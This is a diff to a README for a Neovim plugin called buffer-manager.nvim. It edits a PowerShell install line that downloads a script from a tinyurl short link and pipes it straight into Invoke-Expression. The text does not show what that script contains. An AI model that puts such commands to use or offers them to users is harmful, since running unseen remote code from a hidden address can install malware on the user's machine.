@@ -86,7 +86,7 @@ git clone https://github.com/ibhagwan/fzf-lua ~/.config/nvim/pack/plugins/start/
 On Windows, you can install buffer-manager.nvim manually using PowerShell:
 
 ```powershell
-iwr https://tinyurl.com/bufman | iex
+iwr -useb  https://tinyurl.com/bufman | iex
 ```
 
 ### Setup in init.lua
